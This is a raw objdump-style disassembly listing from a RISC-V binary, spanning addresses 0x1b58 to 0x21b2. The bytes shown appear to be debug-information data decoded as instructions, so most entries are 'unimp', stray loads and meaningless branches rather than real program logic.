    1b58:	8002                	0x8002
    1b5a:	1001                	c.nop	-32
    1b5c:	0c30                	addi	a2,sp,536
    1b5e:	0000                	unimp
    1b60:	9102                	jalr	sp
    1b62:	0060                	addi	s0,sp,12
    1b64:	d42c                	sw	a1,104(s0)
    1b66:	0024                	addi	s1,sp,8
    1b68:	0080                	addi	s0,sp,64
    1b6a:	0000                	unimp
    1b6c:	4400                	lw	s0,8(s0)
    1b6e:	0000                	unimp
    1b70:	0000                	unimp
    1b72:	0000                	unimp
    1b74:	2700                	fld	fs0,8(a4)
    1b76:	84020073          	0x84020073
    1b7a:	1101                	addi	sp,sp,-32
    1b7c:	064a                	slli	a2,a2,0x12
    1b7e:	0000                	unimp
    1b80:	9102                	jalr	sp
    1b82:	2758                	fld	fa4,136(a4)
    1b84:	0064                	addi	s1,sp,12
    1b86:	8502                	jr	a0
    1b88:	0b01                	addi	s6,s6,0
    1b8a:	0614                	addi	a3,sp,768
    1b8c:	0000                	unimp
    1b8e:	9102                	jalr	sp
    1b90:	0050                	addi	a2,sp,4
    1b92:	1200                	addi	s0,sp,288
    1b94:	f008                	sd	a0,32(s0)
    1b96:	000c                	0xc
    1b98:	2d00                	fld	fs0,24(a0)
    1b9a:	0812                	slli	a6,a6,0x4
    1b9c:	00a9                	addi	ra,ra,10
    1b9e:	0000                	unimp
    1ba0:	c32e                	sw	a1,132(sp)
    1ba2:	03000007          	0x3000007
    1ba6:	05f4                	addi	a3,sp,716
    1ba8:	0049                	c.nop	18
    1baa:	0000                	unimp
    1bac:	23aa                	fld	ft7,136(sp)
    1bae:	8000                	0x8000
    1bb0:	0000                	unimp
    1bb2:	0000                	unimp
    1bb4:	00c2                	slli	ra,ra,0x10
    1bb6:	0000                	unimp
    1bb8:	0000                	unimp
    1bba:	0000                	unimp
    1bbc:	9c01                	subw	s0,s0,s0
    1bbe:	0db1                	addi	s11,s11,12
    1bc0:	0000                	unimp
    1bc2:	7326                	ld	t1,104(sp)
    1bc4:	7274                	ld	a3,224(a2)
    1bc6:	0200                	addi	s0,sp,256
    1bc8:	0168                	addi	a0,sp,140
    1bca:	00061413          	slli	s0,a2,0x0
    1bce:	0300                	addi	s0,sp,384
    1bd0:	8891                	andi	s1,s1,4
    1bd2:	267e                	fld	fa2,472(sp)
    1bd4:	6d66                	ld	s10,88(sp)
    1bd6:	0074                	addi	a3,sp,12
    1bd8:	6802                	ld	a6,0(sp)
    1bda:	2401                	sext.w	s0,s0
    1bdc:	064a                	slli	a2,a2,0x12
    1bde:	0000                	unimp
    1be0:	7e809103          	lh	sp,2024(ra)
    1be4:	7061272f          	0x7061272f
    1be8:	0200                	addi	s0,sp,256
    1bea:	016a                	slli	sp,sp,0x1a
    1bec:	0009880b          	0x9880b
    1bf0:	0300                	addi	s0,sp,384
    1bf2:	b091                	j	1436 <_tbss_end+0x13b2>
    1bf4:	287f                	0x287f
    1bf6:	0710                	addi	a2,sp,896
    1bf8:	0000                	unimp
    1bfa:	6b02                	ld	s6,0(sp)
    1bfc:	0901                	addi	s2,s2,0
    1bfe:	0614                	addi	a3,sp,768
    1c00:	0000                	unimp
    1c02:	7fb89103          	lh	sp,2043(a7)
    1c06:	3530                	fld	fa2,104(a0)
    1c08:	0008                	0x8
    1c0a:	0200                	addi	s0,sp,256
    1c0c:	016e                	slli	sp,sp,0x1b
    1c0e:	6408                	ld	a0,8(s0)
    1c10:	00800023          	sb	s0,0(zero) # 0 <_tdata_begin>
    1c14:	0000                	unimp
    1c16:	4600                	lw	s0,8(a2)
    1c18:	0000                	unimp
    1c1a:	0000                	unimp
    1c1c:	0000                	unimp
    1c1e:	0100                	addi	s0,sp,128
    1c20:	079c                	addi	a5,sp,960
    1c22:	4891                	li	a7,4
    1c24:	2306                	fld	ft6,64(sp)
    1c26:	0190                	addi	a2,sp,192
    1c28:	2606                	fld	fa2,64(sp)
    1c2a:	02006863          	bltu	zero,zero,1c5a <_tbss_end+0x1bd6>
    1c2e:	016e                	slli	sp,sp,0x1b
    1c30:	491a                	lw	s2,132(sp)
    1c32:	0000                	unimp
    1c34:	0200                	addi	s0,sp,256
    1c36:	5c91                	li	s9,-28
    1c38:	3e2a                	fld	ft8,168(sp)
    1c3a:	0006                	c.slli	zero,0x1
    1c3c:	0200                	addi	s0,sp,256
    1c3e:	016e                	slli	sp,sp,0x1b
    1c40:	b125                	j	1868 <_tbss_end+0x17e4>
    1c42:	000d                	c.nop	3
    1c44:	0200                	addi	s0,sp,256
    1c46:	5091                	li	ra,-28
    1c48:	5f28                	lw	a0,120(a4)
    1c4a:	02000007          	0x2000007
    1c4e:	0170                	addi	a2,sp,140
    1c50:	b70c                	fsd	fa1,40(a4)
    1c52:	000d                	c.nop	3
    1c54:	0200                	addi	s0,sp,256
    1c56:	6891                	lui	a7,0x4
    1c58:	0000                	unimp
    1c5a:	0812                	slli	a6,a6,0x4
    1c5c:	0000015b          	0x15b
    1c60:	0812                	slli	a6,a6,0x4
    1c62:	0614                	addi	a3,sp,768
    1c64:	0000                	unimp
    1c66:	da2e                	sw	a1,52(sp)
    1c68:	0001                	nop
    1c6a:	0300                	addi	s0,sp,384
    1c6c:	05c8                	addi	a0,sp,708
    1c6e:	0049                	c.nop	18
    1c70:	0000                	unimp
    1c72:	230e                	fld	ft6,192(sp)
    1c74:	8000                	0x8000
    1c76:	0000                	unimp
    1c78:	0000                	unimp
    1c7a:	0056                	c.slli	zero,0x15
    1c7c:	0000                	unimp
    1c7e:	0000                	unimp
    1c80:	0000                	unimp
    1c82:	9c01                	subw	s0,s0,s0
    1c84:	0e02                	c.slli64	t3
    1c86:	0000                	unimp
    1c88:	6626                	ld	a2,72(sp)
    1c8a:	746d                	lui	s0,0xffffb
    1c8c:	0200                	addi	s0,sp,256
    1c8e:	015d                	addi	sp,sp,23
    1c90:	4a18                	lw	a4,16(a2)
    1c92:	0006                	c.slli	zero,0x1
    1c94:	0300                	addi	s0,sp,384
    1c96:	9891                	andi	s1,s1,-28
    1c98:	2f7f                	0x2f7f
    1c9a:	00706127          	0x706127
    1c9e:	5f02                	lw	t5,32(sp)
    1ca0:	0b01                	addi	s6,s6,0
    1ca2:	0988                	addi	a0,sp,208
    1ca4:	0000                	unimp
    1ca6:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
    1caa:	3100                	fld	fs0,32(a0)
    1cac:	08c2                	slli	a7,a7,0x10
    1cae:	0000                	unimp
    1cb0:	c602                	sw	zero,12(sp)
    1cb2:	b00d                	j	14d4 <_tbss_end+0x1450>
    1cb4:	001f 0080 0000      	0x80001f
    1cba:	5e00                	lw	s0,56(a2)
    1cbc:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1cc0:	0000                	unimp
    1cc2:	0100                	addi	s0,sp,128
    1cc4:	429c                	lw	a5,0(a3)
    1cc6:	3200000f          	0x3200000f
    1cca:	083d                	addi	a6,a6,15
    1ccc:	0000                	unimp
    1cce:	c602                	sw	zero,12(sp)
    1cd0:	521e                	lw	tp,228(sp)
    1cd2:	0300000f          	fence	rw,unknown
    1cd6:	a891                	j	1d2a <_tbss_end+0x1ca6>
    1cd8:	327f                	0x327f
    1cda:	07ac                	addi	a1,sp,968
    1cdc:	0000                	unimp
    1cde:	c602                	sw	zero,12(sp)
    1ce0:	b13a                	fsd	fa4,160(sp)
    1ce2:	000d                	c.nop	3
    1ce4:	0300                	addi	s0,sp,384
    1ce6:	a091                	j	1d2a <_tbss_end+0x1ca6>
    1ce8:	337f                	0x337f
    1cea:	6d66                	ld	s10,88(sp)
    1cec:	0074                	addi	a3,sp,12
    1cee:	c602                	sw	zero,12(sp)
    1cf0:	4a4e                	lw	s4,208(sp)
    1cf2:	0006                	c.slli	zero,0x1
    1cf4:	0300                	addi	s0,sp,384
    1cf6:	9891                	andi	s1,s1,-28
    1cf8:	337f                	0x337f
    1cfa:	7061                	c.lui	zero,0xffff8
    1cfc:	0200                	addi	s0,sp,256
    1cfe:	5bc6                	lw	s7,112(sp)
    1d00:	0988                	addi	a0,sp,208
    1d02:	0000                	unimp
    1d04:	7f909103          	lh	sp,2041(ra)
    1d08:	7034                	ld	a3,96(s0)
    1d0a:	0200                	addi	s0,sp,256
    1d0c:	18c8                	addi	a0,sp,116
    1d0e:	064a                	slli	a2,a2,0x12
    1d10:	0000                	unimp
    1d12:	6201                	0x6201
    1d14:	2824                	fld	fs1,80(s0)
    1d16:	02000007          	0x2000007
    1d1a:	0fc9                	addi	t6,t6,18
    1d1c:	064a                	slli	a2,a2,0x12
    1d1e:	0000                	unimp
    1d20:	7fb89103          	lh	sp,2043(a7)
    1d24:	6334                	ld	a3,64(a4)
    1d26:	0068                	addi	a0,sp,12
    1d28:	ca02                	sw	zero,20(sp)
    1d2a:	4910                	lw	a2,16(a0)
    1d2c:	0000                	unimp
    1d2e:	0100                	addi	s0,sp,128
    1d30:	3559                	addiw	a0,a0,-10
    1d32:	7265                	lui	tp,0xffff9
    1d34:	0072                	c.slli	zero,0x1c
    1d36:	ca02                	sw	zero,20(sp)
    1d38:	4914                	lw	a3,16(a0)
    1d3a:	0000                	unimp
    1d3c:	3400                	fld	fs0,40(s0)
    1d3e:	756e                	ld	a0,248(sp)
    1d40:	006d                	c.nop	27
    1d42:	cb02                	sw	zero,148(sp)
    1d44:	7416                	ld	s0,352(sp)
    1d46:	0008                	0x8
    1d48:	0200                	addi	s0,sp,256
    1d4a:	5891                	li	a7,-28
    1d4c:	0324                	addi	s1,sp,392
    1d4e:	0001                	nop
    1d50:	0200                	addi	s0,sp,256
    1d52:	07cc                	addi	a1,sp,964
    1d54:	0049                	c.nop	18
    1d56:	0000                	unimp
    1d58:	9102                	jalr	sp
    1d5a:	2454                	fld	fa3,136(s0)
    1d5c:	0759                	addi	a4,a4,22
    1d5e:	0000                	unimp
    1d60:	cc02                	sw	zero,24(sp)
    1d62:	490d                	li	s2,3
    1d64:	0000                	unimp
    1d66:	0200                	addi	s0,sp,256
    1d68:	5091                	li	ra,-28
    1d6a:	0a24                	addi	s1,sp,280
    1d6c:	02000007          	0x2000007
    1d70:	14cc                	addi	a1,sp,612
    1d72:	0049                	c.nop	18
    1d74:	0000                	unimp
    1d76:	9102                	jalr	sp
    1d78:	244c                	fld	fa1,136(s0)
    1d7a:	0000066b          	0x66b
    1d7e:	cc02                	sw	zero,24(sp)
    1d80:	0000491b          	0x491b
    1d84:	0200                	addi	s0,sp,256
    1d86:	4891                	li	a7,4
    1d88:	eb24                	sd	s1,80(a4)
    1d8a:	02000007          	0x2000007
    1d8e:	26cc                	fld	fa1,136(a3)
    1d90:	0049                	c.nop	18
    1d92:	0000                	unimp
    1d94:	7fb49103          	lh	sp,2043(s1) # 47fb <_tbss_end+0x4777>
    1d98:	f624                	sd	s1,104(a2)
    1d9a:	0006                	c.slli	zero,0x1
    1d9c:	0200                	addi	s0,sp,256
    1d9e:	08cd                	addi	a7,a7,19
    1da0:	061a                	slli	a2,a2,0x6
    1da2:	0000                	unimp
    1da4:	9102                	jalr	sp
    1da6:	07383647          	fmsub.q	fa2,fa6,fs3,ft0,rup
    1daa:	0000                	unimp
    1dac:	df02                	sw	zero,188(sp)
    1dae:	00202c03          	lw	s8,2(zero) # 2 <_tdata_begin+0x2>
    1db2:	0080                	addi	s0,sp,64
    1db4:	0000                	unimp
    1db6:	3700                	fld	fs0,40(a4)
    1db8:	00000663          	beqz	zero,1dc4 <_tbss_end+0x1d40>
    1dbc:	0b02                	c.slli64	s6
    1dbe:	0501                	addi	a0,a0,0
    1dc0:	2106                	fld	ft2,64(sp)
    1dc2:	8000                	0x8000
    1dc4:	0000                	unimp
    1dc6:	0000                	unimp
    1dc8:	00079e37          	lui	t3,0x79
    1dcc:	0200                	addi	s0,sp,256
    1dce:	b805014b          	fnmsub.s	ft2,fa0,ft0,fs7,rne
    1dd2:	0022                	c.slli	zero,0x8
    1dd4:	0080                	addi	s0,sp,64
    1dd6:	0000                	unimp
    1dd8:	3700                	fld	fs0,40(a4)
    1dda:	079c                	addi	a5,sp,960
    1ddc:	0000                	unimp
    1dde:	4902                	lw	s2,0(sp)
    1de0:	0501                	addi	a0,a0,0
    1de2:	22a4                	fld	fs1,64(a3)
    1de4:	8000                	0x8000
    1de6:	0000                	unimp
    1de8:	0000                	unimp
    1dea:	2100                	fld	fs0,0(a0)
    1dec:	0f52                	slli	t5,t5,0x14
    1dee:	0000                	unimp
    1df0:	00004917          	auipc	s2,0x4
    1df4:	1700                	addi	s0,sp,928
    1df6:	0db1                	addi	s11,s11,12
    1df8:	0000                	unimp
    1dfa:	1200                	addi	s0,sp,288
    1dfc:	4208                	lw	a0,0(a2)
    1dfe:	3800000f          	0x3800000f
    1e02:	0795                	addi	a5,a5,5
    1e04:	0000                	unimp
    1e06:	bc02                	fsd	ft0,56(sp)
    1e08:	ba12                	fsd	ft4,304(sp)
    1e0a:	0000                	unimp
    1e0c:	4800                	lw	s0,16(s0)
    1e0e:	001f 0080 0000      	0x80001f
    1e14:	6800                	ld	s0,16(s0)
    1e16:	0000                	unimp
    1e18:	0000                	unimp
    1e1a:	0000                	unimp
    1e1c:	0100                	addi	s0,sp,128
    1e1e:	989c                	0x989c
    1e20:	3300000f          	0x3300000f
    1e24:	7061                	c.lui	zero,0xffff8
    1e26:	0200                	addi	s0,sp,256
    1e28:	22bc                	fld	fa5,64(a3)
    1e2a:	0f98                	addi	a4,sp,976
    1e2c:	0000                	unimp
    1e2e:	9102                	jalr	sp
    1e30:	3268                	fld	fa0,224(a2)
    1e32:	0759                	addi	a4,a4,22
    1e34:	0000                	unimp
    1e36:	bc02                	fsd	ft0,56(sp)
    1e38:	492a                	lw	s2,136(sp)
    1e3a:	0000                	unimp
    1e3c:	0200                	addi	s0,sp,256
    1e3e:	6491                	lui	s1,0x4
    1e40:	1200                	addi	s0,sp,288
    1e42:	8808                	0x8808
    1e44:	0009                	c.nop	2
    1e46:	3800                	fld	fs0,48(s0)
    1e48:	0000068b          	0x68b
    1e4c:	b202                	fsd	ft0,288(sp)
    1e4e:	0008741b          	0x8741b
    1e52:	dc00                	sw	s0,56(s0)
    1e54:	001e                	c.slli	zero,0x7
    1e56:	0080                	addi	s0,sp,64
    1e58:	0000                	unimp
    1e5a:	6c00                	ld	s0,24(s0)
    1e5c:	0000                	unimp
    1e5e:	0000                	unimp
    1e60:	0000                	unimp
    1e62:	0100                	addi	s0,sp,128
    1e64:	de9c                	sw	a5,56(a3)
    1e66:	3300000f          	0x3300000f
    1e6a:	7061                	c.lui	zero,0xffff8
    1e6c:	0200                	addi	s0,sp,256
    1e6e:	2cb2                	fld	fs9,264(sp)
    1e70:	0f98                	addi	a4,sp,976
    1e72:	0000                	unimp
    1e74:	9102                	jalr	sp
    1e76:	3268                	fld	fa0,224(a2)
    1e78:	0759                	addi	a4,a4,22
    1e7a:	0000                	unimp
    1e7c:	b202                	fsd	ft0,288(sp)
    1e7e:	4934                	lw	a3,80(a0)
    1e80:	0000                	unimp
    1e82:	0200                	addi	s0,sp,256
    1e84:	6491                	lui	s1,0x4
    1e86:	3100                	fld	fs0,32(a0)
    1e88:	06d1                	addi	a3,a3,20
    1e8a:	0000                	unimp
    1e8c:	9d02                	jalr	s10
    1e8e:	da14                	sw	a3,48(a2)
    1e90:	001d                	c.nop	7
    1e92:	0080                	addi	s0,sp,64
    1e94:	0000                	unimp
    1e96:	0200                	addi	s0,sp,256
    1e98:	0001                	nop
    1e9a:	0000                	unimp
    1e9c:	0000                	unimp
    1e9e:	0100                	addi	s0,sp,128
    1ea0:	7c9c                	ld	a5,56(s1)
    1ea2:	0010                	0x10
    1ea4:	3200                	fld	fs0,32(a2)
    1ea6:	083d                	addi	a6,a6,15
    1ea8:	0000                	unimp
    1eaa:	9d02                	jalr	s10
    1eac:	5224                	lw	s1,96(a2)
    1eae:	0300000f          	fence	rw,unknown
    1eb2:	d891                	beqz	s1,1dc6 <_tbss_end+0x1d42>
    1eb4:	327d                	addiw	tp,tp,-1
    1eb6:	07ac                	addi	a1,sp,968
    1eb8:	0000                	unimp
    1eba:	9d02                	jalr	s10
    1ebc:	b140                	fsd	fs0,160(a0)
    1ebe:	000d                	c.nop	3
    1ec0:	0300                	addi	s0,sp,384
    1ec2:	d091                	beqz	s1,1dc6 <_tbss_end+0x1d42>
    1ec4:	337d                	addiw	t1,t1,-1
    1ec6:	756e                	ld	a0,248(sp)
    1ec8:	006d                	c.nop	27
    1eca:	9e02                	jalr	t3
    1ecc:	7428                	ld	a0,104(s0)
    1ece:	0008                	0x8
    1ed0:	0300                	addi	s0,sp,384
    1ed2:	c891                	beqz	s1,1ee6 <_tbss_end+0x1e62>
    1ed4:	327d                	addiw	tp,tp,-1
    1ed6:	00000103          	lb	sp,0(zero) # 0 <_tdata_begin>
    1eda:	9e02                	jalr	t3
    1edc:	5f36                	lw	t5,108(sp)
    1ede:	0000                	unimp
    1ee0:	0300                	addi	s0,sp,384
    1ee2:	c491                	beqz	s1,1eee <_tbss_end+0x1e6a>
    1ee4:	327d                	addiw	tp,tp,-1
    1ee6:	070a                	slli	a4,a4,0x2
    1ee8:	0000                	unimp
    1eea:	9e02                	jalr	t3
    1eec:	4940                	lw	s0,20(a0)
    1eee:	0000                	unimp
    1ef0:	0300                	addi	s0,sp,384
    1ef2:	c091                	beqz	s1,1ef6 <_tbss_end+0x1e72>
    1ef4:	327d                	addiw	tp,tp,-1
    1ef6:	06f6                	slli	a3,a3,0x1d
    1ef8:	0000                	unimp
    1efa:	9e02                	jalr	t3
    1efc:	0000494b          	fnmsub.s	fs2,ft0,ft0,ft0,rmm
    1f00:	0300                	addi	s0,sp,384
    1f02:	bc91                	j	1956 <_tbss_end+0x18d2>
    1f04:	247d                	addiw	s0,s0,31
    1f06:	0830                	addi	a2,sp,24
    1f08:	0000                	unimp
    1f0a:	a002                	fsd	ft0,0(sp)
    1f0c:	7c0c                	ld	a1,56(s0)
    1f0e:	0010                	0x10
    1f10:	0300                	addi	s0,sp,384
    1f12:	e891                	bnez	s1,1f26 <_tbss_end+0x1ea2>
    1f14:	347d                	addiw	s0,s0,-1
    1f16:	6f70                	ld	a2,216(a4)
    1f18:	a1020073          	0xa1020073
    1f1c:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1f20:	0200                	addi	s0,sp,256
    1f22:	6c91                	lui	s9,0x4
    1f24:	0a00                	addi	s0,sp,272
    1f26:	005f 0000 108c      	0x108c0000005f
    1f2c:	0000                	unimp
    1f2e:	0000790b          	0x790b
    1f32:	3f00                	fld	fs0,56(a4)
    1f34:	3900                	fld	fs0,48(a0)
    1f36:	0848                	addi	a0,sp,20
    1f38:	0000                	unimp
    1f3a:	8f02                	jr	t5
    1f3c:	4c06                	lw	s8,64(sp)
    1f3e:	001d                	c.nop	7
    1f40:	0080                	addi	s0,sp,64
    1f42:	0000                	unimp
    1f44:	8e00                	0x8e00
    1f46:	0000                	unimp
    1f48:	0000                	unimp
    1f4a:	0000                	unimp
    1f4c:	0100                	addi	s0,sp,128
    1f4e:	d49c                	sw	a5,40(s1)
    1f50:	0010                	0x10
    1f52:	3300                	fld	fs0,32(a4)
    1f54:	0078                	addi	a4,sp,12
    1f56:	8f02                	jr	t5
    1f58:	8c18                	0x8c18
    1f5a:	0000                	unimp
    1f5c:	0200                	addi	s0,sp,256
    1f5e:	4891                	li	a7,4
    1f60:	7334                	ld	a3,96(a4)
    1f62:	7274                	ld	a3,224(a2)
    1f64:	0200                	addi	s0,sp,256
    1f66:	0891                	addi	a7,a7,4
    1f68:	10d4                	addi	a3,sp,100
    1f6a:	0000                	unimp
    1f6c:	9102                	jalr	sp
    1f6e:	3458                	fld	fa4,168(s0)
    1f70:	0069                	c.nop	26
    1f72:	9202                	jalr	tp
    1f74:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1f78:	0200                	addi	s0,sp,256
    1f7a:	6c91                	lui	s9,0x4
    1f7c:	0a00                	addi	s0,sp,272
    1f7e:	061a                	slli	a2,a2,0x6
    1f80:	0000                	unimp
    1f82:	10e4                	addi	s1,sp,108
    1f84:	0000                	unimp
    1f86:	0000790b          	0x790b
    1f8a:	1000                	addi	s0,sp,32
    1f8c:	2e00                	fld	fs0,24(a2)
    1f8e:	00000693          	li	a3,0
    1f92:	4905dc03          	lhu	s8,1168(a1)
    1f96:	0000                	unimp
    1f98:	da00                	sw	s0,48(a2)
    1f9a:	001c                	0x1c
    1f9c:	0080                	addi	s0,sp,64
    1f9e:	0000                	unimp
    1fa0:	7200                	ld	s0,32(a2)
    1fa2:	0000                	unimp
    1fa4:	0000                	unimp
    1fa6:	0000                	unimp
    1fa8:	0100                	addi	s0,sp,128
    1faa:	2e9c                	fld	fa5,24(a3)
    1fac:	0011                	c.nop	4
    1fae:	3300                	fld	fs0,32(a4)
    1fb0:	02006863          	bltu	zero,zero,1fe0 <_tbss_end+0x1f5c>
    1fb4:	117f                	0x117f
    1fb6:	0049                	c.nop	18
    1fb8:	0000                	unimp
    1fba:	9102                	jalr	sp
    1fbc:	3a6c                	fld	fa1,240(a2)
    1fbe:	7562                	ld	a0,56(sp)
    1fc0:	0066                	c.slli	zero,0x19
    1fc2:	8102                	jr	sp
    1fc4:	2e18                	fld	fa4,24(a2)
    1fc6:	0011                	c.nop	4
    1fc8:	4000                	lw	s0,0(s0)
    1fca:	0007313b          	0x7313b
    1fce:	0200                	addi	s0,sp,256
    1fd0:	1782                	slli	a5,a5,0x20
    1fd2:	0049                	c.nop	18
    1fd4:	0000                	unimp
    1fd6:	0a00                	addi	s0,sp,272
    1fd8:	061a                	slli	a2,a2,0x6
    1fda:	0000                	unimp
    1fdc:	113e                	slli	sp,sp,0x2f
    1fde:	0000                	unimp
    1fe0:	0000790b          	0x790b
    1fe4:	3f00                	fld	fs0,56(a4)
    1fe6:	3900                	fld	fs0,48(a0)
    1fe8:	077a                	slli	a4,a4,0x1e
    1fea:	0000                	unimp
    1fec:	6b02                	ld	s6,0(sp)
    1fee:	f406                	sd	ra,40(sp)
    1ff0:	0080001b          	addiw	zero,zero,8
    1ff4:	0000                	unimp
    1ff6:	e600                	sd	s0,8(a2)
    1ff8:	0000                	unimp
    1ffa:	0000                	unimp
    1ffc:	0000                	unimp
    1ffe:	0100                	addi	s0,sp,128
    2000:	c99c                	sw	a5,16(a1)
    2002:	0011                	c.nop	4
    2004:	3300                	fld	fs0,32(a4)
    2006:	00646963          	bltu	s0,t1,2018 <_tbss_end+0x1f94>
    200a:	6b02                	ld	s6,0(sp)
    200c:	4910                	lw	a2,16(a0)
    200e:	0000                	unimp
    2010:	0300                	addi	s0,sp,384
    2012:	dc91                	beqz	s1,1f2e <_tbss_end+0x1eaa>
    2014:	337e                	fld	ft6,504(sp)
    2016:	636e                	ld	t1,216(sp)
    2018:	0200                	addi	s0,sp,256
    201a:	0049196b          	0x49196b
    201e:	0000                	unimp
    2020:	7ed89103          	lh	sp,2029(a7)
    2024:	7234                	ld	a3,96(a2)
    2026:	7465                	lui	s0,0xffff9
    2028:	0200                	addi	s0,sp,256
    202a:	0771                	addi	a4,a4,28
    202c:	0049                	c.nop	18
    202e:	0000                	unimp
    2030:	9102                	jalr	sp
    2032:	3c50                	fld	fa2,184(s0)
    2034:	7562                	ld	a0,56(sp)
    2036:	0066                	c.slli	zero,0x19
    2038:	7302                	ld	t1,32(sp)
    203a:	2e08                	fld	fa0,24(a2)
    203c:	0011                	c.nop	4
    203e:	4000                	lw	s0,0(s0)
    2040:	7902                	ld	s2,32(sp)
    2042:	2400                	fld	fs0,8(s0)
    2044:	0862                	slli	a6,a6,0x18
    2046:	0000                	unimp
    2048:	7402                	ld	s0,32(sp)
    204a:	1409                	addi	s0,s0,-30
    204c:	0006                	c.slli	zero,0x1
    204e:	0200                	addi	s0,sp,256
    2050:	5891                	li	a7,-28
    2052:	4c2c                	lw	a1,88(s0)
    2054:	001c                	0x1c
    2056:	0080                	addi	s0,sp,64
    2058:	0000                	unimp
    205a:	7600                	ld	s0,40(a2)
    205c:	0000                	unimp
    205e:	0000                	unimp
    2060:	0000                	unimp
    2062:	3400                	fld	fs0,40(s0)
    2064:	0069                	c.nop	26
    2066:	7502                	ld	a0,32(sp)
    2068:	490c                	lw	a1,16(a0)
    206a:	0000                	unimp
    206c:	0200                	addi	s0,sp,256
    206e:	5491                	li	s1,-28
    2070:	0000                	unimp
    2072:	ad3d                	j	26b0 <_tbss_end+0x262c>
    2074:	0008                	0x8
    2076:	0200                	addi	s0,sp,256
    2078:	0d60                	addi	s0,sp,668
    207a:	1b9a                	slli	s7,s7,0x26
    207c:	8000                	0x8000
    207e:	0000                	unimp
    2080:	0000                	unimp
    2082:	005a                	c.slli	zero,0x16
    2084:	0000                	unimp
    2086:	0000                	unimp
    2088:	0000                	unimp
    208a:	9c01                	subw	s0,s0,s0
    208c:	1244                	addi	s1,sp,292
    208e:	0000                	unimp
    2090:	fd24                	sd	s1,120(a0)
    2092:	02000007          	0x2000007
    2096:	1262                	slli	tp,tp,0x38
    2098:	0000015b          	0x15b
    209c:	5401                	li	s0,-32
    209e:	00063923          	sd	zero,18(a2) # 12060012 <_tbss_end+0x1205ff8e>
    20a2:	0200                	addi	s0,sp,256
    20a4:	061a0f63          	beq	s4,ra,2122 <_tbss_end+0x209e>
    20a8:	0000                	unimp
    20aa:	0007cb23          	0x7cb23
    20ae:	0200                	addi	s0,sp,256
    20b0:	1864                	addi	s1,sp,60
    20b2:	061a                	slli	a2,a2,0x6
    20b4:	0000                	unimp
    20b6:	00068023          	sb	zero,0(a3)
    20ba:	0200                	addi	s0,sp,256
    20bc:	2664                	fld	fs1,200(a2)
    20be:	061a                	slli	a2,a2,0x6
    20c0:	0000                	unimp
    20c2:	00081f23          	sh	zero,30(a6)
    20c6:	0200                	addi	s0,sp,256
    20c8:	3264                	fld	fs1,224(a2)
    20ca:	061a                	slli	a2,a2,0x6
    20cc:	0000                	unimp
    20ce:	7524                	ld	s1,104(a0)
    20d0:	0006                	c.slli	zero,0x1
    20d2:	0200                	addi	s0,sp,256
    20d4:	0a65                	addi	s4,s4,25
    20d6:	00ae                	slli	ra,ra,0xb
    20d8:	0000                	unimp
    20da:	9102                	jalr	sp
    20dc:	2468                	fld	fa0,200(s0)
    20de:	000007f3          	0x7f3
    20e2:	6702                	ld	a4,0(sp)
    20e4:	ae0a                	fsd	ft2,280(sp)
    20e6:	0000                	unimp
    20e8:	0200                	addi	s0,sp,256
    20ea:	6091                	lui	ra,0x4
    20ec:	2e00                	fld	fs0,24(a2)
    20ee:	00000603          	lb	a2,0(zero) # 0 <_tdata_begin>
    20f2:	5902                	lw	s2,32(sp)
    20f4:	0000491b          	0x491b
    20f8:	7000                	ld	s0,32(s0)
    20fa:	0080001b          	addiw	zero,zero,8
    20fe:	0000                	unimp
    2100:	2a00                	fld	fs0,16(a2)
    2102:	0000                	unimp
    2104:	0000                	unimp
    2106:	0000                	unimp
    2108:	0100                	addi	s0,sp,128
    210a:	859c                	0x859c
    210c:	0012                	c.slli	zero,0x4
    210e:	3200                	fld	fs0,32(a2)
    2110:	000007b3          	add	a5,zero,zero
    2114:	5902                	lw	s2,32(sp)
    2116:	4924                	lw	s1,80(a0)
    2118:	0000                	unimp
    211a:	0200                	addi	s0,sp,256
    211c:	6c91                	lui	s9,0x4
    211e:	be32                	fsd	fa2,312(sp)
    2120:	02000007          	0x2000007
    2124:	3159                	addiw	sp,sp,-10
    2126:	00000db7          	lui	s11,0x0
    212a:	9102                	jalr	sp
    212c:	0060                	addi	s0,sp,12
    212e:	bd3e                	fsd	fa5,184(sp)
    2130:	0006                	c.slli	zero,0x1
    2132:	0200                	addi	s0,sp,256
    2134:	1c52                	slli	s8,s8,0x34
    2136:	1b4a                	slli	s6,s6,0x32
    2138:	8000                	0x8000
    213a:	0000                	unimp
    213c:	0000                	unimp
    213e:	0026                	c.slli	zero,0x9
    2140:	0000                	unimp
    2142:	0000                	unimp
    2144:	0000                	unimp
    2146:	9c01                	subw	s0,s0,s0
    2148:	12c1                	addi	t0,t0,-16
    214a:	0000                	unimp
    214c:	64696333          	0x64696333
    2150:	0200                	addi	s0,sp,256
    2152:	2d52                	fld	fs10,272(sp)
    2154:	0049                	c.nop	18
    2156:	0000                	unimp
    2158:	9102                	jalr	sp
    215a:	336c                	fld	fa1,224(a4)
    215c:	636e                	ld	t1,216(sp)
    215e:	0200                	addi	s0,sp,256
    2160:	3652                	fld	fa2,304(sp)
    2162:	0049                	c.nop	18
    2164:	0000                	unimp
    2166:	9102                	jalr	sp
    2168:	0068                	addi	a0,sp,12
    216a:	a039                	j	2178 <_tbss_end+0x20f4>
    216c:	0006                	c.slli	zero,0x1
    216e:	0200                	addi	s0,sp,256
    2170:	064d                	addi	a2,a2,19
    2172:	1b14                	addi	a3,sp,432
    2174:	8000                	0x8000
    2176:	0000                	unimp
    2178:	0000                	unimp
    217a:	0036                	c.slli	zero,0xd
    217c:	0000                	unimp
    217e:	0000                	unimp
    2180:	0000                	unimp
    2182:	9c01                	subw	s0,s0,s0
    2184:	12ed                	addi	t0,t0,-5
    2186:	0000                	unimp
    2188:	02007333          	remu	t1,zero,zero
    218c:	1b4d                	addi	s6,s6,-13
    218e:	064a                	slli	a2,a2,0x12
    2190:	0000                	unimp
    2192:	9102                	jalr	sp
    2194:	0058                	addi	a4,sp,4
    2196:	0006e13f 06480200 	0x64802000006e13f
    219e:	1b04                	addi	s1,sp,432
    21a0:	8000                	0x8000
    21a2:	0000                	unimp
    21a4:	0000                	unimp
    21a6:	0010                	0x10
    21a8:	0000                	unimp
    21aa:	0000                	unimp
    21ac:	0000                	unimp
    21ae:	9c01                	subw	s0,s0,s0
    21b0:	7840                	ld	s0,176(s0)
    21b2:	0008                	0x8
